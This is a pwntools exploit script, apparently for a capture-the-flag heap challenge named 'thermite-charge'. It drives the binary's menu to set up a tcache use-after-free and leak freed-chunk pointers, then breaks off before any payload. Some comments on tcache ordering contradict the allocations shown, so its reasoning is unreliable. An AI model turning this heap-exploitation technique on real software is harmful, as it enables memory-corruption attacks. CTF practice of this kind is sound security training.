from pwn import *
context.log_level='info'
context.arch='amd64'
exe = './thermite-charge'
libc = ELF('libc-2.31.so', checksec=False)
ld = './ld-2.31.so'

def start():
    return process([ld, '--library-path', './libs', exe])

def menu(io, choice):
    io.recvuntil(b'> ')
    io.sendline(str(choice).encode())

def plant(io, slot, size, data):
    menu(io, 1)
    io.recvuntil(b'slot (0-15): ')
    io.sendline(str(slot).encode())
    io.recvuntil(b'size: ')
    io.sendline(str(size).encode())
    io.recvuntil(b'new payload: ')
    io.send(data)

def defuse(io, slot):
    menu(io, 2)
    io.recvuntil(b'slot: ')
    io.sendline(str(slot).encode())

def rewire(io, slot, data):
    menu(io, 3)
    io.recvuntil(b'slot: ')
    io.sendline(str(slot).encode())
    io.recvuntil(b'new payload: ')
    io.send(data)

def inspect(io, slot):
    menu(io, 4)
    io.recvuntil(b'slot: ')
    io.sendline(str(slot).encode())

io = start()
# plant 0x18 chunk (0x20 user) in slot 0, defuse it -> tcache 0x20
plant(io, 0, 0x18, b'A'*0x18)
defuse(io, 0)
# plant another 0x18 chunk in slot 1 -> reuses freed chunk
plant(io, 1, 0x18, b'B'*0x18)
# defuse slot1 -> tcache head = chunk1, next = chunk0
defuse(io, 1)
# rewiring slot 0 (defused) writes into chunk0 which is 2nd in tcache -> overwrite its fd (next ptr) with a target
# but we need a libc leak first. Let's inspect slot 0 to see contents (fd pointers)
inspect(io, 0)
io.recvuntil(b'new payload: ')  # actually inspect prints size bytes
data = io.recv(0x18)
print('inspect slot0:', data.hex())
io.interactive()
EOF
